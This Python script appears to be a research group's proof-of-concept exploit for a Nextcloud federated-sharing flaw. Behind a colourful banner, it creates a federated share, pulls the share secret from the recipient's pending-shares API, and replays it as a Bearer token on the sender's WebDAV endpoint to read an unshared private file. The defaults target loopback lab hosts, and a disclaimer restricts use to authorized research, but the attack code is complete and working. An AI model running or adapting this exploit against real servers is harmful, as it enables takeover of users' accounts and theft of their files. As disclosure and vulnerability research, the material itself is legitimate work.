#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: nextcloud-federated-ocm-token (Critical)
#  Vendor: Nextcloud GmbH
#  Versions: Nextcloud Server 35.0.0
#  Impact: Federated recipient -> sharer app password / full Files tree
#  Requires: federated OCM pending share; DAV Bearer on sender; do not call access-token first
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "nextcloud-federated-ocm-token"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Local oracle for unpublished Nextcloud federated share PERMANENT_TOKEN.

Sender alice federates one file to bob@recipient. Recipient pending API
returns the share secret as refresh_token. That secret is an unscoped
PERMANENT_TOKEN for alice. Unauth Bearer DAV on the sender reads a private
file that is not in the share.

Do not call OCM access-token (first exchange locks FS scope; TEMPORARY OCM
access tokens are rejected on /remote.php/dav). Loopback only. No shells.
"""
from __future__ import annotations

import base64
import json
import os
import urllib.error
import urllib.parse
import urllib.request

SENDER = os.environ.get("SENDER_URL", "http://127.0.0.1:18340").rstrip("/")
RECIPIENT = os.environ.get("RECIPIENT_URL", "http://127.0.0.1:18341").rstrip("/")
ALICE = os.environ.get("NC_SENDER_USER", "alice")
ALICE_PASS = os.environ.get("NC_SENDER_PASSWORD", "LabAlice35!")
BOB = os.environ.get("NC_RECIPIENT_USER", "bob")
BOB_PASS = os.environ.get("NC_RECIPIENT_PASSWORD", "LabBob35!")
SHARE_WITH = os.environ.get("NC_SHARE_WITH", "bob@http://recipient")
SHARED_NAME = "shared-with-bob.txt"
WITNESS = "NEXTCLOUD-OCM-PERMANENT-TOKEN-WITNESS"
WITNESS_FILE = WITNESS + ".txt"


def fail(msg: str) -> None:
    print(f"FAIL NEXTCLOUD-OCM-PERMANENT-TOKEN {msg}", flush=True)
    raise SystemExit(1)


def basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 60.0,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": "nextcloud-federated-ocm-token-lab"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        fail(f"http {method} {url} error {exc}")


def ocs(
    method: str,
    base: str,
    path: str,
    user: str,
    password: str,
    payload: dict[str, str] | None = None,
) -> tuple[int, dict]:
    body = None
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    if payload is not None:
        body = urllib.parse.urlencode(payload).encode()
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    sep = "&" if "?" in path else "?"
    url = base + path + sep + "format=json"
    code, _, raw = http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        fail(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed


def ocs_data(parsed: dict) -> dict | list | None:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def ocs_meta(parsed: dict) -> dict:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def as_share_list(data: object) -> list[dict]:
    if data is None:
        return []
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict):
        if "refresh_token" in data or "token" in data:
            return [data]
        el = data.get("element")
        if isinstance(el, list):
            return [x for x in el if isinstance(x, dict)]
        if isinstance(el, dict):
            return [el]
    return []


def main() -> None:
    print(
        f"IOC sender={SENDER} recipient={RECIPIENT} sharer={ALICE} shareWith={SHARE_WITH}",
        flush=True,
    )

    code, parsed = ocs("GET", SENDER, "/ocs/v2.php/cloud/users/" + ALICE, ALICE, ALICE_PASS)
    print(f"IOC alice-login http={code} meta={ocs_meta(parsed)}", flush=True)
    if code not in (200, 201):
        fail(f"alice login http={code} meta={ocs_meta(parsed)}")

    code, parsed = ocs("GET", RECIPIENT, "/ocs/v2.php/cloud/users/" + BOB, BOB, BOB_PASS)
    print(f"IOC bob-login http={code} meta={ocs_meta(parsed)}", flush=True)
    if code not in (200, 201):
        fail(f"bob login http={code} meta={ocs_meta(parsed)}")

    code, parsed = ocs(
        "POST",
        SENDER,
        "/ocs/v2.php/apps/files_sharing/api/v1/shares",
        ALICE,
        ALICE_PASS,
        {
            "path": "/" + SHARED_NAME,
            "shareType": "6",
            "shareWith": SHARE_WITH,
            "permissions": "1",
        },
    )
    data = ocs_data(parsed)
    print(
        f"IOC create-share http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:800]}",
        flush=True,
    )
    if code not in (200, 201):
        fail(f"create share http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:400]}")

    code, parsed = ocs(
        "GET",
        RECIPIENT,
        "/ocs/v2.php/apps/files_sharing/api/v1/remote_shares/pending",
        BOB,
        BOB_PASS,
    )
    data = ocs_data(parsed)
    shares = as_share_list(data)
    print(
        f"IOC pending http={code} meta={ocs_meta(parsed)} count={len(shares)} data={json.dumps(data)[:1200]}",
        flush=True,
    )
    if code not in (200, 201) or not shares:
        fail(f"pending shares http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:400]}")

    share = shares[0]
    refresh = str(share.get("refresh_token") or share.get("token") or "")
    access = share.get("access_token") or ""
    print(
        f"IOC pending refresh_token_len={len(refresh)} access_token_len={len(str(access))} remote={share.get('remote')!r} name={share.get('name')!r}",
        flush=True,
    )
    if len(refresh) != 32:
        fail(f"refresh_token_len={len(refresh)} expected=32")
    if access:
        print("IOC pending-has-access-token (recipient may have auto-exchanged)", flush=True)

    dav_path = f"/remote.php/dav/files/{ALICE}/{WITNESS_FILE}"
    dav_code, dav_hdrs, dav_body = http(
        "GET",
        SENDER + dav_path,
        headers={"Authorization": f"Bearer {refresh}"},
    )
    text = dav_body.decode("utf-8", "replace")
    xuid = dav_hdrs.get("x-user-id", "")
    print(
        f"IOC dav-bearer http={dav_code} x-user-id={xuid!r} body={text[:200]!r}",
        flush=True,
    )
    if dav_code in (401, 403):
        fail(f"dav bearer http={dav_code} body={text[:300]!r}")
    if dav_code != 200:
        fail(f"dav bearer http={dav_code} body={text[:300]!r}")
    if WITNESS not in text:
        fail(f"dav body missing witness got={text[:200]!r}")
    if xuid and xuid != ALICE:
        fail(f"x-user-id={xuid!r} expected={ALICE!r}")

    print(
        f"SUCCESS NEXTCLOUD-OCM-PERMANENT-TOKEN who=federated-recipient uid={ALICE} {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"unhandled {type(exc).__name__}: {exc}")

